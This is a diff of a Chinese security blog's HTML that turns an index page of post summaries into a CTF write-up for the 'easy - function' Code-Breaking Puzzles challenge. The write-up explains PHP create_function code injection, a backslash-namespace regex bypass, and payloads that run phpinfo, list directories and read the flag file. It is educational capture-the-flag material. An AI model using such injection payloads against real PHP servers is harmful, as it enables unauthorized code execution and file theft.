@@ -22,7 +22,7 @@
     <meta name="description" content="信息安全技术博客">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-    <title>C1imber&#39;s Blog</title>
+    <title>Code-Breaking Puzzles挑战 · C1imber&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >C1imber&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Code-Breaking Puzzles挑战</a>
+            </div>
+    </div>
     
     <a class="home-link" href=/>C1imber's Blog</a>
 </header>
@@ -220,24 +231,74 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            Code-Breaking Puzzles挑战
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">878</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2018/11/30</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,309 +399,85 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/11/30/Code-Breaking Puzzles挑战/" >
-            
-                <span>Code-Breaking Puzzles挑战</span>
-        </a>
-        <div class="abstract-content">
-            Code-Breaking Puzzles挑战序前段时间由于出差参加攻防演练，错过了P牛师傅小密圈二周年的Code-Breaking Puzzles，还好回来以后题目还在，赶紧做了做，题目质量很高，通过这次又学到了很多知识，感谢师傅用心出的题目
-easy - function题目代码如下：
-123456789&lt;?php$action = $_GET['action'] ?? '';$arg = $_GET['arg'] ?? '';if(preg_match('/^[a-z0-9_]*$/isD', $action)) &#123;    show_source(__FILE__)...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/30</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Code-Breaking-Puzzles挑战"><a href="#Code-Breaking-Puzzles挑战" class="headerlink" title="Code-Breaking Puzzles挑战"></a>Code-Breaking Puzzles挑战</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>前段时间由于出差参加攻防演练，错过了P牛师傅小密圈二周年的Code-Breaking Puzzles，还好回来以后题目还在，赶紧做了做，题目质量很高，通过这次又学到了很多知识，感谢师傅用心出的题目</strong></p>
+<h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p><strong>题目代码如下：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</div><div class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</div><div class="line">    show_source(<span class="keyword">__FILE__</span>);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">    $action(<span class="string">''</span>, $arg);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><strong>题目环境为PHP/7.2.12加上Apache/2.4.25 (Debian)</strong></p>
+<p><strong>首先通过<code>$action(&#39;&#39;, $arg);</code>可以想到PHP的动态代码执行，通过这里面的参数可以看出这里应该使用<code>create_function</code>这个函数去进行代码执行，关于这个函数的执行流程如下：</strong></p>
+<pre><code>1.获取参数, 函数体;
+
+2.拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串;
+
+3.eval;
+
+4.通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错;
+
+5.定义一个函数名:”\000_lambda_” . count(anonymous_functions)++;
+
+6.用新的函数名替换__lambda_func;
+
+7.返回新的函数。
+</code></pre><p><strong>以上流程可以简单理解为在使用该函数时会生成一个匿名函数，该函数的第一个参数会作为匿名函数的参数传入，该函数的第二个参数为匿名函数要执行的代码段，看下面的代码实例：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $func=create_function(<span class="string">'$a,$b'</span>,<span class="string">'echo $a+$b;'</span>);</div><div class="line">    $func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line">    <span class="comment">//3</span></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>这段代码的执行过程等价于</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">($a,b)</span></span></div><div class="line"><span class="function">	</span>&#123;</div><div class="line">        <span class="keyword">echo</span> $a+$b;</div><div class="line">	&#125;</div><div class="line">    anonymous_func(<span class="number">1</span>,<span class="number">2</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p><strong>于是有了一个思路，这里可以传入<code>action=create_function&amp;arg=}phpinfo();/*</code>去执行phpinfo,这样构造的原因是因为这里通过<code>create_function</code>生成的匿名函数并没有赋值给任何变量，所以无法调用该匿名函数，但是由于此处的环境是php的<code>eval</code>环境，所以可以通过<code>}</code>去闭合该匿名函数，之后就执行任意代码了，而这里的<code>/*</code>用来注释后面多出的代码，这里执行的代码如下</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">create_function(<span class="string">''</span>,<span class="string">'&#125;phpinfo();/*'</span>);</div></pre></td></tr></table></figure>
+<p><strong>实际执行过程变为了如下代码</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">	<span class="function"><span class="keyword">function</span> <span class="title">anonymous_func</span><span class="params">()</span></span>&#123;&#125;phpinfo();\*&#125; </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><strong>于是便可以成功执行phpinfo,但是这道题里只是这样构造是不可以的，这里还需要绕过对传入的<code>$action</code>的正则检查，通过正则可以看出<code>$action</code>的内容不能只包含数字字母和<code>_</code>，在这里面卡了好久，于是看了P牛的讲解，这里可以通过在函数名前加上<code>\</code>去绕过，构造<code>action=\create_function&amp;arg=}phpinfo();/*</code>就可以成功执行phpinfo</strong></p>
+<p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181130/oNzIUYcJHOL4.png" alt="mark"></p>
+<p><strong>至于函数前面为什么可以加<code>\</code>,P牛也给出了详细的解释，这里用到了php当中的命名空间，在php当中有一个默认的命名空间为<code>\</code>，PHP当中的所有原生函数和类都在这个命名空间下，平常我们在使用函数的时候直接写函数名去调用函数实际上用的是相对路径，而在函数名前面加上<code>\</code>用的是绝对路径去调用函数</strong></p>
+<p><strong>接下来尝试使用命令执行函数执行命令，但是发现命令执行函数都被禁用掉了</strong><br><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181130/i3Ar2ajDTduJ.png" alt="mark"></p>
+<p><strong>只能通过执行代码的方式寻找flag文件了</strong></p>
+<p><strong>寻找flag文件的位置</strong></p>
+<pre><code>action=\create_function&amp;arg=}print_r(scandir(&quot;/var/www/&quot;));/*
+</code></pre><p><strong>找到flag文件的位置在<code>/var/www</code>目录下</strong></p>
+<p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181130/lv67vOhsSTJO.png" alt="mark"></p>
+<p><strong>读取flag</strong></p>
+<pre><code>action=\create_function&amp;arg=}echo file_get_contents(&quot;/var/www/flag_h0w2execute_arb1trary_c0de&quot;);/*
+</code></pre><p><img src="http://pibh2b15s.bkt.clouddn.com/blog/20181130/LHgNeuJvbjkm.png" alt="mark"></p>
+
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/11/19/2018湖湘杯/" >
-            
-                <span>2018湖湘杯注入题writeup</span>
-        </a>
-        <div class="abstract-content">
-            2018湖湘杯注入题writeup序这段时间事情很多，导致这次比赛没有报上名，周日总算闲了下来，看到师傅在群里发了几个题目的链接，于是滑了一波水，在这里记录一下
-WEB Code Check其实昨天写这道题的时候并不知道这个题的题目是什么（有点尴尬），打开题目发现是一个登陆框，进行正常的登陆流程时会出现如下的错误，所以猜测该登陆功能可能不能正常使用看到登陆处显示平台正在停机维护，不能正常使用应该和这个有一些关系吧接下来查看页面源代码，尝试发现问题，看到有一处连接
-http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://lawlietweb.com">C1imber</a>
+            <p>原文链接：<a href="http://lawlietweb.com/2018/11/30/Code-Breaking Puzzles挑战/">http://lawlietweb.com/2018/11/30/Code-Breaking Puzzles挑战/</a>
+            <p>发表日期：<a href="http://lawlietweb.com/2018/11/30/Code-Breaking Puzzles挑战/">November 30th 2018, 7:00:05 pm</a>
+            <p>更新日期：<a href="http://lawlietweb.com/2018/11/30/Code-Breaking Puzzles挑战/">November 30th 2018, 7:00:05 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/11/19</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/10/26/深入学习PHP反序列化漏洞-绕过_wakeup()函数/" >
-            
-                <span>深入学习PHP反序列化漏洞-绕过_wakeup()函数</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="深入学习PHP反序列化漏洞-绕过-wakeup-函数"><a href="#深入学习PHP反序列化漏洞-绕过-wakeup-函数" class="headerlink" title="深入学习PHP反序列化漏洞-绕过_wakeup()函数"></a>深入学习PHP反序列化漏洞-绕过_wakeup()函数</h1><h3 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h3><p><strong>代码如下，要求利用php反序列化漏洞去读取<code>flag.php</code>文件中的内容</strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"> <span class="meta">&lt;?php</span></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123; </div><div class="line">    <span class="keyword">protected</span> $file=<span class="string">'index.php'</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123; </div><div class="line">      <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</div><div class="line">       <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt; file,<span class="string">"\\"</span>)===<span class="keyword">false</span> &amp;&amp;  strchr(<span class="keyword">$this</span>-&gt;file, <span class="string">'/'</span>)===<span class="keyword">false</span>)</div><div class="line">          show_source(dirname (<span class="keyword">__FILE__</span>).<span class="string">'/'</span>.<span class="keyword">$this</span> -&gt;file);</div><div class="line">       <span class="keyword">else</span>      <span class="keyword">die</span>(<span class="string">'Wrong filename.'</span>);</div><div class="line">      &#125;&#125;  </div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123; <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>; &#125; </div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="string">''</span> ;&#125;&#125;     </div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>]))&#123; show_source(<span class="string">'index.php'</span>); &#125; </div><div class="line">    <span class="keyword">else</span>&#123; </div><div class="line">       $file=base64_decode( $_GET[<span class="string">'file'</span>]); </div><div class="line">       <span class="keyword">echo</span> unserialize($file ); &#125; </div><div class="line"><span class="meta">?&gt;</span>   <span class="comment">#&lt;!--key in flag.php--&gt;</span></div></pre></td></tr></table></figure>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/10/22/MarkdownXss/" >
-            
-                <span>测试一下Markdown Xss</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="测试一下Markdown-xss"><a href="#测试一下Markdown-xss" class="headerlink" title="测试一下Markdown xss"></a>测试一下Markdown xss</h1>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/22</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "xss">xss</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/10/08/记一次ctf极限利用-不包含数字字母的webshell/" >
-            
-                <span>记一次ctf极限利用-不包含数字字母的webshell</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="记一次ctf极限利用-不包含数字字母的webshell"><a href="#记一次ctf极限利用-不包含数字字母的webshell" class="headerlink" title="记一次ctf极限利用-不包含数字字母的webshell"></a>记一次ctf极限利用-不包含数字字母的webshell</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>问题来自于同事给我一道安恒的ctf赛题，题目代码如下</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">include <span class="string">'flag.php'</span>;</div><div class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'code'</span>]))&#123;</div><div class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">'code'</span>];</div><div class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;35)&#123;</div><div class="line">        die(<span class="string">"Long."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,<span class="variable">$code</span>))&#123;</div><div class="line">        die(<span class="string">"NO."</span>);</div><div class="line">    &#125;</div><div class="line">    @<span class="built_in">eval</span>(<span class="variable">$code</span>);</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    highlight_file(__FILE__);</div><div class="line">&#125;</div><div class="line">//<span class="variable">$hint</span> =  <span class="string">"php function getFlag() to get flag"</span>;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/10/08</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/09/07/Ecshop2.x & 3.x版本最新漏洞分析与利用/" >
-            
-                <span>Ecshop2.x注入漏洞&amp;代码执行漏洞分析</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="Ecshop2-x注入漏洞-amp-代码执行漏洞分析"><a href="#Ecshop2-x注入漏洞-amp-代码执行漏洞分析" class="headerlink" title="Ecshop2.x注入漏洞&amp;代码执行漏洞分析"></a>Ecshop2.x注入漏洞&amp;代码执行漏洞分析</h1><h3 id="序"><a href="#序" class="headerlink" title="序"></a>序</h3><p><strong>Ecshop最近爆出了两个高危漏洞，分别是SQL注入漏洞和代码执行漏洞，刚好自己在学代码审计方面的知识，于是自己针对两个漏洞的成因分析了一波，发现这是一个很有意思的二次漏洞，在这将整个学习过程做个记录</strong><br>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/07</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/09/02/2018-09-02/" >
-            
-                <span>记一次有意思的XSS绕过之奇葩的中文尖括号</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="记一次有意思的XSS绕过之奇葩的中文尖括号"><a href="#记一次有意思的XSS绕过之奇葩的中文尖括号" class="headerlink" title="记一次有意思的XSS绕过之奇葩的中文尖括号"></a>记一次有意思的XSS绕过之奇葩的中文尖括号</h1><p><strong>记录一个我实战中遇到的比较有意思的XSS绕过，过滤方式比较奇葩，把<code>&gt;</code>变为了中文的尖括号<code>＞</code>，导致插入页面的<code>xss payload</code>不能被浏览器解析，但是经过一番测试无意间发现了一种绕过方式，构造方法比较特殊，在这分享一下~</strong><br>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/09/02</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞挖掘">漏洞挖掘</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/26/ssrf/" >
-            
-                <span>ssrf漏洞原理以及利用方法</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="ssrf漏洞原理以及利用方法"><a href="#ssrf漏洞原理以及利用方法" class="headerlink" title="ssrf漏洞原理以及利用方法"></a>ssrf漏洞原理以及利用方法</h1><p><strong>ssrf漏洞，全称为服务端请求伪造漏洞，由于有的web应用需要实现从其它服务器上获取资源的功能，但是没有对url进行限制，导致可以构造非本意的url对内网或者其它服务器发起恶意请求。ssrf漏洞的危害可以通过ssrf漏洞可以对内网或本地机器进行主机发现，服务版本探测或者针对内网或本地一些薄弱的应用进行攻击，同时利用ssrf漏洞还可以时服务器主动发起请求，从而做为一个攻击跳板或者绕过CDN找到其服务器的真实ip</strong><br>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "ssrf">ssrf</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/26/2018-08-26/" >
-            
-                <span>Centos6 更新curl版本</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="Centos6-更新curl版本"><a href="#Centos6-更新curl版本" class="headerlink" title="Centos6 更新curl版本"></a>Centos6 更新curl版本</h1><p><strong>由于自己的Centos6.5 curl版本为7.19.7，版本太低，所以要升级curl的版本，之前自己直接采取了源码安装最新版本的方式去升级，结果导致安装完毕后自己电脑的curl版本和php-curl版本不一致的问题</strong><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/IBHCm64DGe.png?imageslim" alt="mark"><br><img src="http://p008biu9n.bkt.clouddn.com/blog/180826/Ekhi4h6K4a.png?imageslim" alt="mark"><br><strong>于是自己上网查了好久，终于找到了解决办法，在这里记录一下</strong><br>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/26</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "Linux">Linux</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/2018/08/19/redis/" >
-            
-                <span>centos环境下的redis未授权访问漏洞的几种利用方式</span>
-        </a>
-        <div class="abstract-content">
-            <h1 id="centos环境下的redis未授权访问漏洞的几种利用方式"><a href="#centos环境下的redis未授权访问漏洞的几种利用方式" class="headerlink" title="centos环境下的redis未授权访问漏洞的几种利用方式"></a>centos环境下的redis未授权访问漏洞的几种利用方式</h1><p><strong>这篇文章记录一下redis未授权访问漏洞的几种利用方式,包括如何利用redis未授权访问漏洞通过任务计划反弹shell，向网站根目录写webshell以及利用redis未授权访问向服务器写入ssh公钥</strong><br>
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2018/08/19</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞复现">漏洞复现</a>
-    
-</div>
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2018/11/19/2018湖湘杯/" title= "2018湖湘杯注入题writeup">
+                    <div class="prevTitle">2018湖湘杯注入题writeup</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
-    <nav class="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/6/">6</a><a class="extend next" rel="next" href="/archives/page/2/">NEXT &#62;</a>
-    </nav>
     
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -721,6 +558,24 @@ http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1...
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Code-Breaking-Puzzles挑战"><span class="toc-number">1.</span> <span class="toc-text">Code-Breaking Puzzles挑战</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#序"><span class="toc-number">1.0.1.</span> <span class="toc-text">序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-function"><span class="toc-number">1.0.2.</span> <span class="toc-text">easy - function</span></a></li></ol></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -2428,6 +2283,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
